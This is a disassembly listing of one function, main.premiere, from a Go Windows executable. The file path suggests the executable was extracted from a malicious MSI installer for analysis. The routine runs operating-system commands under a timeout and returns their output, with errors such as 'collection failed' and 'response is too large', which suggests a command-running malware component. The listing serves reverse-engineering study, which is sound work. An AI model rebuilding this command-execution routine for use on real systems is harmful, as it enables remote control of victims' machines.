
/home/ubuntu/malicious_msi_decode/analysis/extracted/support_v1.3/demand.exe:     file format pei-x86-64


Disassembly of section .text:

00000001402747a0 <.text+0x2737a0>:
   1402747a0 <main.premiere>:	4c 8d 64 24 e0       	lea    r12,[rsp-0x20]
   1402747a5:	4d 3b 66 10          	cmp    r12,QWORD PTR [r14+0x10]
   1402747a9:	0f 86 43 04 00 00    	jbe    0x140274bf2
   1402747af:	55                   	push   rbp
   1402747b0:	48 89 e5             	mov    rbp,rsp
   1402747b3:	48 81 ec 98 00 00 00 	sub    rsp,0x98
   1402747ba:	66 44 0f d6 bc 24 90 	movq   QWORD PTR [rsp+0x90],xmm15
   1402747c1:	00 00 00 
   1402747c4:	c6 44 24 3f 00       	mov    BYTE PTR [rsp+0x3f],0x0
   1402747c9:	48 89 84 24 a8 00 00 	mov    QWORD PTR [rsp+0xa8],rax
   1402747d0:	00 
   1402747d1:	48 89 9c 24 b0 00 00 	mov    QWORD PTR [rsp+0xb0],rbx
   1402747d8:	00 
   1402747d9:	48 89 8c 24 b8 00 00 	mov    QWORD PTR [rsp+0xb8],rcx
   1402747e0:	00 
   1402747e1:	48 89 bc 24 c0 00 00 	mov    QWORD PTR [rsp+0xc0],rdi
   1402747e8:	00 
   1402747e9:	48 89 b4 24 c8 00 00 	mov    QWORD PTR [rsp+0xc8],rsi
   1402747f0:	00 
   1402747f1:	44 0f 11 7c 24 68    	movups XMMWORD PTR [rsp+0x68],xmm15
   1402747f7:	44 0f 11 7c 24 58    	movups XMMWORD PTR [rsp+0x58],xmm15
   1402747fd:	48 8d 05 8c 3c 17 00 	lea    rax,[rip+0x173c8c]        # 0x1403e8490 '`\\xa11@\x01\x00\x00\x00\\xa0\\xdb3@\x01\x00\x00\x00[}\\xff\\x87\x00\x00\x00\x00\\xa0\\xc5\n@\x01\x00\x00\x00\x00\\xc6\n@\x01\x00\x00\x00@\\xc6\n@\x01\x00\x00\x00\\xe0\\xc6\n@\x01\x00\x00\x00`\\xa11@\x01\x00\x00\x00`\\xbb2@\x01\x00\x00\x00[ϠC\x00\x00\x00\x00`\\xd3\n@\x01\x00\x00\x00\\x80\\xd4\n@\x01\x00\x00\x00\\xa0\\xd5\n@'
   140274804:	48 8d 1d 15 31 3e 00 	lea    rbx,[rip+0x3e3115]        # 0x140657920 ''
   14027480b:	48 b9 00 d6 11 7e 03 	movabs rcx,0x37e11d600
   140274812:	00 00 00 
   140274815:	e8 26 73 e3 ff       	call   0x1400abb40 <context.WithTimeout>
   14027481a:	48 89 8c 24 90 00 00 	mov    QWORD PTR [rsp+0x90],rcx
   140274821:	00 
   140274822:	c6 44 24 3f 01       	mov    BYTE PTR [rsp+0x3f],0x1
   140274827:	48 8b bc 24 b0 00 00 	mov    rdi,QWORD PTR [rsp+0xb0]
   14027482e:	00 
   14027482f:	48 8b 8c 24 a8 00 00 	mov    rcx,QWORD PTR [rsp+0xa8]
   140274836:	00 
   140274837:	48 85 ff             	test   rdi,rdi
   14027483a:	74 08                	je     0x140274844
   14027483c:	80 39 40             	cmp    BYTE PTR [rcx],0x40
   14027483f:	0f 94 c2             	sete   dl
   140274842:	eb 02                	jmp    0x140274846
   140274844:	31 d2                	xor    edx,edx
   140274846:	84 d2                	test   dl,dl
   140274848:	0f 84 20 01 00 00    	je     0x14027496e
   14027484e:	48 83 ff 01          	cmp    rdi,0x1
   140274852:	0f 82 6b 03 00 00    	jb     0x140274bc3
   140274858:	48 8d 5f ff          	lea    rbx,[rdi-0x1]
   14027485c:	48 89 da             	mov    rdx,rbx
   14027485f:	48 f7 da             	neg    rdx
   140274862:	48 c1 fa 3f          	sar    rdx,0x3f
   140274866:	83 e2 01             	and    edx,0x1
   140274869:	48 8d 04 11          	lea    rax,[rcx+rdx*1]
   14027486d:	48 8b 8c 24 b8 00 00 	mov    rcx,QWORD PTR [rsp+0xb8]
   140274874:	00 
   140274875:	48 8b bc 24 c0 00 00 	mov    rdi,QWORD PTR [rsp+0xc0]
   14027487c:	00 
   14027487d:	48 8b b4 24 c8 00 00 	mov    rsi,QWORD PTR [rsp+0xc8]
   140274884:	00 
   140274885:	e8 d6 22 ed ff       	call   0x140146b60 <os/exec.Command>
   14027488a:	48 89 84 24 80 00 00 	mov    QWORD PTR [rsp+0x80],rax
   140274891:	00 
   140274892:	48 8d 05 27 7b 0d 00 	lea    rax,[rip+0xd7b27]        # 0x14034c3c0 "`\x00\x00\x00\x00\x00\x00\x00H\x00\x00\x00\x00\x00\x00\x00\\xa3/v\\xca\x07\x08\x08\x19\x00\x00\x00\x00\x00\x00\x00\x00(#>@\x01\x00\x00\x00'\\xf4\x00\x00@\\xa7\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00 \\xc44@\x01\x00\x00\x00\t\x00\x00\x00\x00\x00\x00\x00\t\x00\x00\x00\x00\x00\x00\x00\\x9a)\x00\x00\x00\x00\x00\x00\\xe8\x00\x00\x00\x00\x00\x00\x00kV-@"
   140274899:	e8 62 1b da ff       	call   0x140016400 <runtime.newobject>
   14027489e:	c6 00 01             	mov    BYTE PTR [rax],0x1
   1402748a1:	48 8b 94 24 80 00 00 	mov    rdx,QWORD PTR [rsp+0x80]
   1402748a8:	00 
   1402748a9:	84 02                	test   BYTE PTR [rdx],al
   1402748ab:	83 3d 0e 35 3e 00 00 	cmp    DWORD PTR [rip+0x3e350e],0x0        # 0x140657dc0 ''
   1402748b2:	74 18                	je     0x1402748cc
   1402748b4:	48 8b 8a 98 00 00 00 	mov    rcx,QWORD PTR [rdx+0x98]
   1402748bb:	0f 1f 44 00 00       	nop    DWORD PTR [rax+rax*1+0x0]
   1402748c0:	e8 7b 5f e0 ff       	call   0x14007a840 <runtime.gcWriteBarrier2>
   1402748c5:	49 89 03             	mov    QWORD PTR [r11],rax
   1402748c8:	49 89 4b 08          	mov    QWORD PTR [r11+0x8],rcx
   1402748cc:	48 89 82 98 00 00 00 	mov    QWORD PTR [rdx+0x98],rax
   1402748d3:	48 89 d0             	mov    rax,rdx
   1402748d6:	e8 45 38 ed ff       	call   0x140148120 <os/exec.(*Cmd).Start>
   1402748db:	0f 1f 44 00 00       	nop    DWORD PTR [rax+rax*1+0x0]
   1402748e0:	48 85 c0             	test   rax,rax
   1402748e3:	74 3f                	je     0x140274924
   1402748e5:	44 0f 11 7c 24 68    	movups XMMWORD PTR [rsp+0x68],xmm15
   1402748eb:	48 89 44 24 58       	mov    QWORD PTR [rsp+0x58],rax
   1402748f0:	48 89 5c 24 60       	mov    QWORD PTR [rsp+0x60],rbx
   1402748f5:	c6 44 24 3f 00       	mov    BYTE PTR [rsp+0x3f],0x0
   1402748fa:	48 8b 94 24 90 00 00 	mov    rdx,QWORD PTR [rsp+0x90]
   140274901:	00 
   140274902:	48 8b 02             	mov    rax,QWORD PTR [rdx]
   140274905:	ff d0                	call   rax
   140274907:	48 8b 4c 24 58       	mov    rcx,QWORD PTR [rsp+0x58]
   14027490c:	48 8b 44 24 68       	mov    rax,QWORD PTR [rsp+0x68]
   140274911:	48 8b 5c 24 70       	mov    rbx,QWORD PTR [rsp+0x70]
   140274916:	48 8b 7c 24 60       	mov    rdi,QWORD PTR [rsp+0x60]
   14027491b:	48 81 c4 98 00 00 00 	add    rsp,0x98
   140274922:	5d                   	pop    rbp
   140274923:	c3                   	ret
   140274924:	48 8d 05 c5 02 0f 00 	lea    rax,[rip+0xf02c5]        # 0x140364bf0 "donepingUSERPOST/allnullbooltruejson'\\''icmpigmpftpshttppop3smtp) = dialbindfile \r\t\nread on pipeunix"
   14027492b:	48 89 44 24 68       	mov    QWORD PTR [rsp+0x68],rax
   140274930:	48 c7 44 24 70 04 00 	mov    QWORD PTR [rsp+0x70],0x4
   140274937:	00 00 
   140274939:	44 0f 11 7c 24 58    	movups XMMWORD PTR [rsp+0x58],xmm15
   14027493f:	c6 44 24 3f 00       	mov    BYTE PTR [rsp+0x3f],0x0
   140274944:	48 8b 94 24 90 00 00 	mov    rdx,QWORD PTR [rsp+0x90]
   14027494b:	00 
   14027494c:	48 8b 02             	mov    rax,QWORD PTR [rdx]
   14027494f:	ff d0                	call   rax
   140274951:	48 8b 4c 24 58       	mov    rcx,QWORD PTR [rsp+0x58]
   140274956:	48 8b 44 24 68       	mov    rax,QWORD PTR [rsp+0x68]
   14027495b:	48 8b 5c 24 70       	mov    rbx,QWORD PTR [rsp+0x70]
   140274960:	48 8b 7c 24 60       	mov    rdi,QWORD PTR [rsp+0x60]
   140274965:	48 81 c4 98 00 00 00 	add    rsp,0x98
   14027496c:	5d                   	pop    rbp
   14027496d:	c3                   	ret
   14027496e:	48 89 5c 24 78       	mov    QWORD PTR [rsp+0x78],rbx
   140274973:	48 89 44 24 40       	mov    QWORD PTR [rsp+0x40],rax
   140274978:	4c 8b 84 24 c0 00 00 	mov    r8,QWORD PTR [rsp+0xc0]
   14027497f:	00 
   140274980:	4c 8b 8c 24 c8 00 00 	mov    r9,QWORD PTR [rsp+0xc8]
   140274987:	00 
   140274988:	48 8b b4 24 b8 00 00 	mov    rsi,QWORD PTR [rsp+0xb8]
   14027498f:	00 
   140274990:	e8 ab 26 ed ff       	call   0x140147040 <os/exec.CommandContext>
   140274995:	48 89 84 24 80 00 00 	mov    QWORD PTR [rsp+0x80],rax
   14027499c:	00 
   14027499d:	48 8d 05 1c 7a 0d 00 	lea    rax,[rip+0xd7a1c]        # 0x14034c3c0 "`\x00\x00\x00\x00\x00\x00\x00H\x00\x00\x00\x00\x00\x00\x00\\xa3/v\\xca\x07\x08\x08\x19\x00\x00\x00\x00\x00\x00\x00\x00(#>@\x01\x00\x00\x00'\\xf4\x00\x00@\\xa7\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00 \\xc44@\x01\x00\x00\x00\t\x00\x00\x00\x00\x00\x00\x00\t\x00\x00\x00\x00\x00\x00\x00\\x9a)\x00\x00\x00\x00\x00\x00\\xe8\x00\x00\x00\x00\x00\x00\x00kV-@"
   1402749a4:	e8 57 1a da ff       	call   0x140016400 <runtime.newobject>
   1402749a9:	c6 00 01             	mov    BYTE PTR [rax],0x1
   1402749ac:	48 8b 94 24 80 00 00 	mov    rdx,QWORD PTR [rsp+0x80]
   1402749b3:	00 
   1402749b4:	84 02                	test   BYTE PTR [rdx],al
   1402749b6:	83 3d 03 34 3e 00 00 	cmp    DWORD PTR [rip+0x3e3403],0x0        # 0x140657dc0 ''
   1402749bd:	74 13                	je     0x1402749d2
   1402749bf:	48 8b 8a 98 00 00 00 	mov    rcx,QWORD PTR [rdx+0x98]
   1402749c6:	e8 75 5e e0 ff       	call   0x14007a840 <runtime.gcWriteBarrier2>
   1402749cb:	49 89 03             	mov    QWORD PTR [r11],rax
   1402749ce:	49 89 4b 08          	mov    QWORD PTR [r11+0x8],rcx
   1402749d2:	48 89 82 98 00 00 00 	mov    QWORD PTR [rdx+0x98],rax
   1402749d9:	48 89 d0             	mov    rax,rdx
   1402749dc:	0f 1f 40 00          	nop    DWORD PTR [rax+0x0]
   1402749e0:	e8 9b 50 ed ff       	call   0x140149a80 <os/exec.(*Cmd).CombinedOutput>
   1402749e5:	48 89 7c 24 48       	mov    QWORD PTR [rsp+0x48],rdi
   1402749ea:	48 89 84 24 88 00 00 	mov    QWORD PTR [rsp+0x88],rax
   1402749f1:	00 
   1402749f2:	48 89 5c 24 50       	mov    QWORD PTR [rsp+0x50],rbx
   1402749f7:	48 8b 4c 24 40       	mov    rcx,QWORD PTR [rsp+0x40]
   1402749fc:	48 8b 49 28          	mov    rcx,QWORD PTR [rcx+0x28]
   140274a00:	48 8b 44 24 78       	mov    rax,QWORD PTR [rsp+0x78]
   140274a05:	ff d1                	call   rcx
   140274a07:	48 8b 0d e2 bc 38 00 	mov    rcx,QWORD PTR [rip+0x38bce2]        # 0x1406006f0 '\\x80\\>@\x01\x00\x00\x00 ye@\x01\x00\x00\x00.\\x836@\x01\x00\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00@\\>@\x01\x00\x00\x00 \x07`@\x01\x00\x00\x00\\xe3\\xab6@\x01\x00\x00\x00\x15\x00\x00\x00\x00\x00\x00\x00@\\>@\x01\x00\x00\x00\\xa0\x07`@\x01\x00\x00\x00@\\>@\x01\x00\x00\x00\\xb0\x07`@\x01\x00\x00\x00@\\>@'
   140274a0e:	48 8b 3d e3 bc 38 00 	mov    rdi,QWORD PTR [rip+0x38bce3]        # 0x1406006f8 ' ye@\x01\x00\x00\x00.\\x836@\x01\x00\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00@\\>@\x01\x00\x00\x00 \x07`@\x01\x00\x00\x00\\xe3\\xab6@\x01\x00\x00\x00\x15\x00\x00\x00\x00\x00\x00\x00@\\>@\x01\x00\x00\x00\\xa0\x07`@\x01\x00\x00\x00@\\>@\x01\x00\x00\x00\\xb0\x07`@\x01\x00\x00\x00@\\>@\x01\x00\x00\x00\\xc0\x07`@'
   140274a15:	e8 e6 e2 e0 ff       	call   0x140082d00 <errors.Is>
   140274a1a:	66 0f 1f 44 00 00    	nop    WORD PTR [rax+rax*1+0x0]
   140274a20:	84 c0                	test   al,al
   140274a22:	0f 85 37 01 00 00    	jne    0x140274b5f
   140274a28:	48 8b 4c 24 50       	mov    rcx,QWORD PTR [rsp+0x50]
   140274a2d:	48 81 f9 00 00 08 00 	cmp    rcx,0x80000
   140274a34:	0f 8f bd 00 00 00    	jg     0x140274af7
   140274a3a:	48 8b 54 24 48       	mov    rdx,QWORD PTR [rsp+0x48]
   140274a3f:	90                   	nop
   140274a40:	48 85 d2             	test   rdx,rdx
   140274a43:	74 64                	je     0x140274aa9
   140274a45:	48 8d 05 94 07 0a 00 	lea    rax,[rip+0xa0794]        # 0x1403151e0 '\x10\x00\x00\x00\x00\x00\x00\x00\x08\x00\x00\x00\x00\x00\x00\x00\\xb7\x00\\x81\\x8e\x07\x08\x08\x19\\xa8I8@\x01\x00\x00\x00H >@\x01\x00\x00\x00-\\xe8\x00\x00 @\x03\x00\\xf0\x15-@\x01\x00\x00\x00@R1@\x01\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\\xf0\x15\x00\x00\x00\x00\x00\x00(\x00\x00\x00\x00\x00\x00\x00&\x00-@'
   140274a4c:	e8 af 19 da ff       	call   0x140016400 <runtime.newobject>
   140274a51:	48 c7 40 08 11 00 00 	mov    QWORD PTR [rax+0x8],0x11
   140274a58:	00 
   140274a59:	48 8d 0d de 3f 0f 00 	lea    rcx,[rip+0xf3fde]        # 0x140368a3e 'collection failedreflect.Value.Intin string literalexec: killing Cmdexec: not startedpermission deni'
   140274a60:	48 89 08             	mov    QWORD PTR [rax],rcx
   140274a63:	44 0f 11 7c 24 68    	movups XMMWORD PTR [rsp+0x68],xmm15
   140274a69:	48 8d 0d d0 11 17 00 	lea    rcx,[rip+0x1711d0]        # 0x1403e5c40 '\\xc0\\xdc0@\x01\x00\x00\x00 @0@\x01\x00\x00\x00\\xa0\\xd23\\x8f\x00\x00\x00\x00\\xe0,\x08@\x01\x00\x00\x00@\\xb30@\x01\x00\x00\x00\\xe0\\xc35@\x01\x00\x00\x00Z\\xdd\x11\\x9f\x00\x00\x00\x00`\\xa4\r@\x01\x00\x00\x00\\xc0\\xdc0@\x01\x00\x00\x00\\x80R2@\x01\x00\x00\x00\x7fJo\\xf6\x00\x00\x00\x00\\xa0\\xc3\n@\x01\x00\x00\x00\\xc0\\xdc0@'
   140274a70:	48 89 4c 24 58       	mov    QWORD PTR [rsp+0x58],rcx
   140274a75:	48 89 44 24 60       	mov    QWORD PTR [rsp+0x60],rax
   140274a7a:	c6 44 24 3f 00       	mov    BYTE PTR [rsp+0x3f],0x0
   140274a7f:	48 8b 94 24 90 00 00 	mov    rdx,QWORD PTR [rsp+0x90]
   140274a86:	00 
   140274a87:	48 8b 0a             	mov    rcx,QWORD PTR [rdx]
   140274a8a:	ff d1                	call   rcx
   140274a8c:	48 8b 4c 24 58       	mov    rcx,QWORD PTR [rsp+0x58]
   140274a91:	48 8b 5c 24 70       	mov    rbx,QWORD PTR [rsp+0x70]
   140274a96:	48 8b 7c 24 60       	mov    rdi,QWORD PTR [rsp+0x60]
   140274a9b:	48 8b 44 24 68       	mov    rax,QWORD PTR [rsp+0x68]
   140274aa0:	48 81 c4 98 00 00 00 	add    rsp,0x98
   140274aa7:	5d                   	pop    rbp
   140274aa8:	c3                   	ret
   140274aa9:	31 c0                	xor    eax,eax
   140274aab:	48 8b 9c 24 88 00 00 	mov    rbx,QWORD PTR [rsp+0x88]
   140274ab2:	00 
   140274ab3:	e8 c8 5a de ff       	call   0x14005a580 <runtime.slicebytetostring>
   140274ab8:	48 89 44 24 68       	mov    QWORD PTR [rsp+0x68],rax
   140274abd:	48 89 5c 24 70       	mov    QWORD PTR [rsp+0x70],rbx
   140274ac2:	44 0f 11 7c 24 58    	movups XMMWORD PTR [rsp+0x58],xmm15
   140274ac8:	c6 44 24 3f 00       	mov    BYTE PTR [rsp+0x3f],0x0
   140274acd:	48 8b 94 24 90 00 00 	mov    rdx,QWORD PTR [rsp+0x90]
   140274ad4:	00 
   140274ad5:	48 8b 32             	mov    rsi,QWORD PTR [rdx]
   140274ad8:	ff d6                	call   rsi
   140274ada:	48 8b 4c 24 58       	mov    rcx,QWORD PTR [rsp+0x58]
   140274adf:	48 8b 44 24 68       	mov    rax,QWORD PTR [rsp+0x68]
   140274ae4:	48 8b 5c 24 70       	mov    rbx,QWORD PTR [rsp+0x70]
   140274ae9:	48 8b 7c 24 60       	mov    rdi,QWORD PTR [rsp+0x60]
   140274aee:	48 81 c4 98 00 00 00 	add    rsp,0x98
   140274af5:	5d                   	pop    rbp
   140274af6:	c3                   	ret
   140274af7:	48 8d 05 e2 06 0a 00 	lea    rax,[rip+0xa06e2]        # 0x1403151e0 '\x10\x00\x00\x00\x00\x00\x00\x00\x08\x00\x00\x00\x00\x00\x00\x00\\xb7\x00\\x81\\x8e\x07\x08\x08\x19\\xa8I8@\x01\x00\x00\x00H >@\x01\x00\x00\x00-\\xe8\x00\x00 @\x03\x00\\xf0\x15-@\x01\x00\x00\x00@R1@\x01\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\\xf0\x15\x00\x00\x00\x00\x00\x00(\x00\x00\x00\x00\x00\x00\x00&\x00-@'
   140274afe:	66 90                	xchg   ax,ax
   140274b00:	e8 fb 18 da ff       	call   0x140016400 <runtime.newobject>
   140274b05:	48 c7 40 08 15 00 00 	mov    QWORD PTR [rax+0x8],0x15
   140274b0c:	00 
   140274b0d:	48 8d 0d 66 60 0f 00 	lea    rcx,[rip+0xf6066]        # 0x14036ab7a 'response is too largeunexpected status: %skey is not comparableafter top-level valuein string escape'
   140274b14:	48 89 08             	mov    QWORD PTR [rax],rcx
   140274b17:	44 0f 11 7c 24 68    	movups XMMWORD PTR [rsp+0x68],xmm15
   140274b1d:	48 8d 0d 1c 11 17 00 	lea    rcx,[rip+0x17111c]        # 0x1403e5c40 '\\xc0\\xdc0@\x01\x00\x00\x00 @0@\x01\x00\x00\x00\\xa0\\xd23\\x8f\x00\x00\x00\x00\\xe0,\x08@\x01\x00\x00\x00@\\xb30@\x01\x00\x00\x00\\xe0\\xc35@\x01\x00\x00\x00Z\\xdd\x11\\x9f\x00\x00\x00\x00`\\xa4\r@\x01\x00\x00\x00\\xc0\\xdc0@\x01\x00\x00\x00\\x80R2@\x01\x00\x00\x00\x7fJo\\xf6\x00\x00\x00\x00\\xa0\\xc3\n@\x01\x00\x00\x00\\xc0\\xdc0@'
   140274b24:	48 89 4c 24 58       	mov    QWORD PTR [rsp+0x58],rcx
   140274b29:	48 89 44 24 60       	mov    QWORD PTR [rsp+0x60],rax
   140274b2e:	c6 44 24 3f 00       	mov    BYTE PTR [rsp+0x3f],0x0
   140274b33:	48 8b 94 24 90 00 00 	mov    rdx,QWORD PTR [rsp+0x90]
   140274b3a:	00 
   140274b3b:	48 8b 0a             	mov    rcx,QWORD PTR [rdx]
   140274b3e:	66 90                	xchg   ax,ax
   140274b40:	ff d1                	call   rcx
   140274b42:	48 8b 4c 24 58       	mov    rcx,QWORD PTR [rsp+0x58]
   140274b47:	48 8b 5c 24 70       	mov    rbx,QWORD PTR [rsp+0x70]
   140274b4c:	48 8b 7c 24 60       	mov    rdi,QWORD PTR [rsp+0x60]
   140274b51:	48 8b 44 24 68       	mov    rax,QWORD PTR [rsp+0x68]
   140274b56:	48 81 c4 98 00 00 00 	add    rsp,0x98
   140274b5d:	5d                   	pop    rbp
   140274b5e:	c3                   	ret
   140274b5f:	48 8d 05 7a 06 0a 00 	lea    rax,[rip+0xa067a]        # 0x1403151e0 '\x10\x00\x00\x00\x00\x00\x00\x00\x08\x00\x00\x00\x00\x00\x00\x00\\xb7\x00\\x81\\x8e\x07\x08\x08\x19\\xa8I8@\x01\x00\x00\x00H >@\x01\x00\x00\x00-\\xe8\x00\x00 @\x03\x00\\xf0\x15-@\x01\x00\x00\x00@R1@\x01\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\\xf0\x15\x00\x00\x00\x00\x00\x00(\x00\x00\x00\x00\x00\x00\x00&\x00-@'
   140274b66:	e8 95 18 da ff       	call   0x140016400 <runtime.newobject>
   140274b6b:	48 c7 40 08 09 00 00 	mov    QWORD PTR [rax+0x8],0x9
   140274b72:	00 
   140274b73:	48 8d 0d 5c 0f 0f 00 	lea    rcx,[rip+0xf0f5c]        # 0x140365ad6 'timed outstate.binnot found of type omitemptyfiles,dnsdns,filesipv6-icmp_outboundlocalhostconnectex#'
   140274b7a:	48 89 08             	mov    QWORD PTR [rax],rcx
   140274b7d:	44 0f 11 7c 24 68    	movups XMMWORD PTR [rsp+0x68],xmm15
   140274b83:	48 8d 0d b6 10 17 00 	lea    rcx,[rip+0x1710b6]        # 0x1403e5c40 '\\xc0\\xdc0@\x01\x00\x00\x00 @0@\x01\x00\x00\x00\\xa0\\xd23\\x8f\x00\x00\x00\x00\\xe0,\x08@\x01\x00\x00\x00@\\xb30@\x01\x00\x00\x00\\xe0\\xc35@\x01\x00\x00\x00Z\\xdd\x11\\x9f\x00\x00\x00\x00`\\xa4\r@\x01\x00\x00\x00\\xc0\\xdc0@\x01\x00\x00\x00\\x80R2@\x01\x00\x00\x00\x7fJo\\xf6\x00\x00\x00\x00\\xa0\\xc3\n@\x01\x00\x00\x00\\xc0\\xdc0@'
   140274b8a:	48 89 4c 24 58       	mov    QWORD PTR [rsp+0x58],rcx
   140274b8f:	48 89 44 24 60       	mov    QWORD PTR [rsp+0x60],rax
   140274b94:	c6 44 24 3f 00       	mov    BYTE PTR [rsp+0x3f],0x0
   140274b99:	48 8b 94 24 90 00 00 	mov    rdx,QWORD PTR [rsp+0x90]
   140274ba0:	00 
   140274ba1:	48 8b 0a             	mov    rcx,QWORD PTR [rdx]
   140274ba4:	ff d1                	call   rcx
   140274ba6:	48 8b 4c 24 58       	mov    rcx,QWORD PTR [rsp+0x58]
   140274bab:	48 8b 5c 24 70       	mov    rbx,QWORD PTR [rsp+0x70]
   140274bb0:	48 8b 7c 24 60       	mov    rdi,QWORD PTR [rsp+0x60]
   140274bb5:	48 8b 44 24 68       	mov    rax,QWORD PTR [rsp+0x68]
   140274bba:	48 81 c4 98 00 00 00 	add    rsp,0x98
   140274bc1:	5d                   	pop    rbp
   140274bc2:	c3                   	ret
   140274bc3:	b8 01 00 00 00       	mov    eax,0x1
   140274bc8:	31 c9                	xor    ecx,ecx
   140274bca:	e8 d1 60 e0 ff       	call   0x14007aca0 <runtime.panicSliceB>
   140274bcf:	90                   	nop
   140274bd0:	e8 0b 8f dc ff       	call   0x14003dae0 <runtime.deferreturn>
   140274bd5:	48 8b 44 24 68       	mov    rax,QWORD PTR [rsp+0x68]
   140274bda:	48 8b 5c 24 70       	mov    rbx,QWORD PTR [rsp+0x70]
   140274bdf:	48 8b 4c 24 58       	mov    rcx,QWORD PTR [rsp+0x58]
   140274be4:	48 8b 7c 24 60       	mov    rdi,QWORD PTR [rsp+0x60]
   140274be9:	48 81 c4 98 00 00 00 	add    rsp,0x98
   140274bf0:	5d                   	pop    rbp
   140274bf1:	c3                   	ret
   140274bf2:	48 89 44 24 08       	mov    QWORD PTR [rsp+0x8],rax
   140274bf7:	48 89 5c 24 10       	mov    QWORD PTR [rsp+0x10],rbx
   140274bfc:	48 89 4c 24 18       	mov    QWORD PTR [rsp+0x18],rcx
   140274c01:	48 89 7c 24 20       	mov    QWORD PTR [rsp+0x20],rdi
   140274c06:	48 89 74 24 28       	mov    QWORD PTR [rsp+0x28],rsi
   140274c0b:	e8 10 3d e0 ff       	call   0x140078920 <runtime.morestack_noctxt>
   140274c10:	48 8b 44 24 08       	mov    rax,QWORD PTR [rsp+0x8]
   140274c15:	48 8b 5c 24 10       	mov    rbx,QWORD PTR [rsp+0x10]
   140274c1a:	48 8b 4c 24 18       	mov    rcx,QWORD PTR [rsp+0x18]
   140274c1f:	48 8b 7c 24 20       	mov    rdi,QWORD PTR [rsp+0x20]
   140274c24:	48 8b 74 24 28       	mov    rsi,QWORD PTR [rsp+0x28]
   140274c29:	e9 72 fb ff ff       	jmp    0x1402747a0 <main.premiere>
   140274c2e:	cc                   	int3
   140274c2f:	cc                   	int3
   140274c30:	cc                   	int3
   140274c31:	cc                   	int3
   140274c32:	cc                   	int3
   140274c33:	cc                   	int3
   140274c34:	cc                   	int3
   140274c35:	cc                   	int3
   140274c36:	cc                   	int3
   140274c37:	cc                   	int3
   140274c38:	cc                   	int3
   140274c39:	cc                   	int3
   140274c3a:	cc                   	int3
   140274c3b:	cc                   	int3
   140274c3c:	cc                   	int3
   140274c3d:	cc                   	int3
   140274c3e:	cc                   	int3
   140274c3f:	cc                   	int3
